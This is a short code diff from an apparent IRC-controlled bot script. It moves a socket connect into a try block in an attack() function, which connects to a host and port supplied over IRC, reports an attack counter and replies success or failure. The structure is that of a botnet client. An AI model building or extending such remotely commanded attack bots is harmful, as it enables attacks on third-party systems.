@@ -49,17 +49,18 @@ def check_attack(line):
 
     return True
 
-
 def attack(s, sender, host, port):
     global COUNTER
     attack_socket = socket.socket()
-    attack_socket.connect((host, port))
     try:
+        attack_socket.connect((host, port))
         attack_socket.send(bytearray('ATTACK COUNTER: ' + str(COUNTER) + ' BOT NAME: ' + NICK + '\n', 'utf-8'))
         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ': attack success\r\n', 'utf-8'))
         COUNTER = COUNTER + 1
     except:
         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : attack failed\r\n', 'utf-8'))
+
+
 
 # returns random 5 char string
 def generate_nickname(length):
